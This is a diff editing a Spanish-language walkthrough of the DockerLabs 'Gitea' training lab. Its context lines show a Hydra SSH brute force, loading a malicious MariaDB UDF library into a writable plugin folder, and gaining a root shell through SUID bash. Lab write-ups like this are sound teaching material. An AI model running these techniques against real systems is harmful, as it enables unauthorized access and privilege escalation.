@@ -4,7 +4,7 @@ summary: "Write-up del laboratorio Gitea de DockerLabs"
 author: elcybercurioso
 date: 2026-02-03 12:53:07
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, gitea, subdomain enumeration, information leaking, credentials leaking, lfi, brute force, ssh, sql, privesc]
 media_subpath: "/assets/img/posts/dockerlabs_gitea"
 image:
   path: main.webp
@@ -282,7 +282,7 @@ Por ello, continuaremos revisando el subdominio `gitea.dl`.
 
 ### gitea.dl
 
-Vemos en la página principal del domino `gitea.dl` un panel de login, y un placeholder para el campo de la contraseña un poco sospechoso:
+Vemos en la página principal del domino `gitea.dl` un panel de login, y un placeholder para el campo de la contraseña un poco sospechoso (lo guardamos para más adelante):
 
 ![Desktop View](/20260120203920.webp){: width="972" height="589" .shadow}
 
@@ -362,15 +362,12 @@ Guardamos todas las contraseñas en un fichero y probamos a ver si alguna de las
 └─$ hydra -l designer -P wordlist ssh://172.17.0.2 -I 
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-20 20:38:17
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
 [DATA] attacking ssh://172.17.0.2:22/
 [22][ssh] host: 172.17.0.2   login: designer   password: **********************
 1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 1 final worker threads did not complete until end.
-[ERROR] 1 target did not resolve or could not be connected
-[ERROR] 0 target did not complete
 ```
 
 Procedemos a conectarnos a la máquina por SSH:
@@ -415,11 +412,11 @@ En el directorio personal del usuario `designer` encontramos la estructura de ca
 ```bash
 designer@c122048a419e:~$ ls -la
 total 64
-drwxr-x--- 1 designer designer 4096 Jan 20 21:38 .
+drwxr-x--- 1 designer designer 4096 XXX XX XX:XX .
 drwxr-xr-x 1 root     root     4096 Feb 24  2025 ..
 -rw-r--r-- 1 designer designer  220 Feb 24  2025 .bash_logout
 -rw-r--r-- 1 designer designer 3771 Feb 24  2025 .bashrc
-drwx------ 2 designer designer 4096 Jan 20 21:38 .cache
+drwx------ 2 designer designer 4096 XXX XX XX:XX .cache
 drwxrwxr-x 3 designer designer 4096 Feb 26  2025 .local
 -rw------- 1 designer designer   13 Feb 26  2025 .mysql_history
 -rw-r--r-- 1 designer designer  807 Feb 24  2025 .profile
@@ -523,7 +520,7 @@ designer@c122048a419e:~$ ls -la | grep raptor
 -rwxrwxr-x 1 designer designer 17464 XXX XX XX:XX raptor_udf2.so
 ```
 
-A la hora de crear una tabla que usaremos para cargar la librería maliciosa, vemos que no tenemos permisos:
+Cuando intentamos crear una tabla para cargar la librería maliciosa, nos damos cuenta de que el usuario `admin` no tiene permisos para ello:
 
 ```bash
 MariaDB [(none)]> use mysql;
@@ -537,7 +534,7 @@ ERROR 1142 (42000): CREATE command denied to user 'admin'@'localhost' for table 
 
 Esto impide poder cargar la librería dentro de la carpeta `plugins` usando una tabla, por lo que debemos hacerlo manualmente.
 
-Listamos la carpeta en la que se encuentran los plugins, que sería `/usr/lib/mysql/plugin/`:
+Listaremos de las variables de entorno la carpeta en la que se encuentran los plugins, que sería `/usr/lib/mysql/plugin/`:
 
 ```bash
 MariaDB [(none)]> show variables like '%plugin%';
@@ -550,7 +547,7 @@ MariaDB [(none)]> show variables like '%plugin%';
 2 rows in set (0.001 sec)
 ```
 
-Procedemos a movernos a dicho directorio, y listar sus permisos, donde vemos que otros pueden escribir:
+Procedemos a movernos a dicho directorio, listar sus permisos, y resulta que tenemos permisos de escritura:
 
 ```bash
 designer@c122048a419e:~$ ls -la /usr/lib/mysql
@@ -617,7 +614,7 @@ designer@c122048a419e:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
 ```
 
-Solo queda invocar la consola de manera privilegiada:
+Ahora solo queda invocar una consola privilegiada:
 
 ```bash
 designer@c122048a419e:~$ bash -p
